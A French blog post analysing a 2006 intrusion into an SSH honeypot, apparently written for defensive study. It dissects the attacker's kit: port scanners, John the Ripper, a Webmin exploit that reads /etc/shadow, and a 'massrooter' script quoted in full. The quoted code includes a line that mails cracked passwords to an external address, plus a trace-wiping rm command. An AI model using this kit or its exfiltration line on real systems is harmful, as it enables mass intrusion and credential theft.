---
title: "Intrusion du 24 novembre 2006"
tags: [honeypot]
---

## Exploit kit

Pour plus d'information sur [Kojoney](http://kojoney.sourceforge.net/), un honeypot ssh, reportez-vous à [un de mes précédents billets]({% link _posts/2011-01-06-Revue-du-honeypot-Kojoney.md%}).  

Une attaque brute force contre les comptes ssh a été lancée le 23 nomvembre aux alentours de 16 heures. La machine attaquante est localisée en Norvège. Le FAI est [telenor.no](http://www.telenor.no/).  

L'attaque est plutôt efficace et prend fin à 16h07 après avoir trouvé différents passwords par défaut (`ftp`, `mysql`, `guest`, `admin`).  

Le 24 à minuit et 43 minutes, le pirate se connecte en utilisant le compte `ftp`. Son adresse IP le situe en Roumanie (FAI [Romtelecom](http://www.romtelecom.ro/)). Aucune autre visite n'a eu lieu entre la fin du brute force et son arrivée.  

Plusieurs commandes sont lancées afin d'obtenir plus d'informations sur la machine :  

```bash
uname -a
hostname
cat /proc/cpuinfo
```

Le visiteur vérifie aussi brievement la présence des commandes `tar` et `wget`.  

Il va alors tenter à plusieurs reprises de télécharger une archive gzip ([conf.tar.gz](http://dary.ro/conf.tar.gz)) mais qui échoue comme le honeypot est à *"faible interraction"* (aucune commande n'est réellement exécutée, tout est simulé)  

Les fichiers présents dans cette archive sont (avec le résultat de la commande file) :  

- **all.chr**: data  

- **alnum.chr**: data  

- **alpha.chr**: data  

- auto: Bourne-Again shell script text executable  

- clean: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, statically linked, stripped  

- **digits.chr**: data  

- do: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), not stripped  

- ex.pl: perl script text executable  

- **john**: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked (uses shared libs), stripped  

- **john.conf**: ASCII English text  

- **lanman.chr**: data  

- **mailer**: Bourne shell script text executable  

- o: Bourne-Again shell script text executable  

- **password.lst**: ASCII English text  

- pscan2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), not stripped  

- scan: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, statically linked, stripped  

- ss: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, statically linked, stripped  

- try: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, statically linked, stripped  

- **unafs**: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), stripped  

- **unique**: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), stripped  

- **unshadow**: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), stripped

## Password collector

Les noms de fichiers que j'ai mis en gras devraient être familier à tout ceux qui ont déjà utilisé [John the Ripper](http://www.openwall.com/john/) (un casseur de mot de passe local). La personne qui a généré l'archive n'a visiblement pas fait le tri (`unafs`, `mailer`, `lanman.chr` et `unique` n'auront probablement pas d'utilité pour l'attaquant)  

Le script `o` lance john sur plusieurs fichiers (non présents) avec l'option `-show` pour afficher les password cassés. Le fichier a sans doute été mis par erreur ou laissé par oubli.  
Le script `auto` demande un début d'adresse IP (par exemple `192.168.0`) et un nom de fichier. Il génère alors une liste d'ips à l'aide d'une boucle (0 -> 255)  

Le script perl [ex.pl](http://www.milw0rm.com/exploits/2017) est un exploit pour *Webmin* qui date de juillet 2006.  

Les binaires sont assez énigmatiques. `clean` semble plus ou moins crypté pour cacher son rôle (un `strings` ne renvoit rien d'intéressant).  

En réalité il lance juste la commande suivante : `rm -rf pass pass2 pass3 john.pot restore john.log ips bios.txt *.pscan.10* wget-log* spart* core*`  

On peut se demander l'utilité de passer par un fichier ELF alors qu'un script shell aurait été plus rapide et surtout plus portable...  

`pscan2` est un scanneur de port horizontal (même port, ips différentes) assez simple qui enregistre les résultats dans un fichier. J'ai pu retrouver [le fichier source sur Internet](http://members.xoom.virgilio.it/zikkolo/federico/pscan.c).

## Washington est dans la place ! Tout baigne !

`ss` est pour le moins surprenant. Là encore le programme dissimule son contenu. En fait il s'agit d'un scanneur de port horizontal tout comme `pscan2` mais bien plus évolué. Il est linké statiquement avec la librairie `pcap` et envoit des paquets SYN au lieu d'établir des connexions complètes. Le traffic est sniffé afin de détecter quelles machines répondent (et donc savoir celles qui ont un port ouvert).  

Ce programme serait tout à fait lambda dans la trousse d'un pirate informatique si les machines qu'il scanne par défaut n'étaient pas aussi *spéciales*.  

Il semble avoir un intérêt tout particulier pour les sites gouvernementaux et militaires ainsi que les centres de recherches. Ainsi il envoit des paquets sur un bon nombre de *.mil*, de *.gov* (et *.gov.cctld*), des *.edu* (comme le célèbre MIT) etc etc.  

Au moins on ne peut pas lui reprocher de faire de la discrimination : Washington, Tel Aviv... et même du côté du soleil levant... tout y passe !  

Les résultats sont enregistrés dans un fichier `bios.txt`.

Tout comme `clean`, `scan` est juste un script shell passé en binaire pour rendre plus difficile à comprendre son fonctionnement.

## Scan, crack, leak, repeat

Après avoir défini un code couleur, il lance les commandes suivantes :  

```bash
if [ $# != 1 ]; then
        echo se da: $0 <b class>
        exit;
fi

echo ${YEL}#@@@@@@@@@@@@@@@${BLU}MASSROOTER${YEL}@@@@@@@@@@@@@@@@@@#
echo ${YEL}############${BLU}By b-u-f-u ,lego & dary ${YEL}#########
echo ${YEL}###############${RED}PRIVATE SHIT${YEL}##################
echo ${RES}

./pscan2 $1 20000
sleep 10
cat $1.pscan.20000 |sort |uniq > ips
./do ips
rm -rf ips
echo ${DGRN}#BAFTA!....
echo ${RES}
```

Ce script utilise `pscan2` pour trouver des machines ayant un port Webmin ouvert (20000) puis pour chaque machine correspondant à ces critères il appelle le programme `do`.

Là vous vous demandez *mais à quoi sert le binaire do ?*  

Et bien c'est la partie qui automatise l'attaque. Pour chaque adresse IP trouvée dans le fichier passé en paramètre (ips dans ce cas), l'exploit pour Webmin est lancé et va tenter d'accèder au fichier `/etc/shadow` du serveur. Différentes tentatives sont faites afin de couvrir différents systèmes (par exemple `master.passwd` pour BSD)  

Les résultats obtenus sont placés dans les fichiers `pass`, `pass2`, `pass3`.  

Pour chacun de ces fichiers `John the Ripper` est lancé en tâche de fond afin de casser les mots de passe. Le résultat final ce sont les éventuels passwords trouvés mis dans un fichier `vuln` et envoyés sur une boîte mail :  

```bash
cat vuln | mail -s woot woot $1 conf.team@gmail.com
```

La commande `try` semble faire la même chose que `do`.

L'intrusion en elle-même n'était pas exceptionnelle, mais les binaires étaient pour le moins intéressants...  

L'étude a été faite dans un environnement chrooté avec des outils comme strace, ltrace et [SoapBox](http://dag.wieers.com/home-made/soapbox/)

*Published January 08 2011 at 13:54*
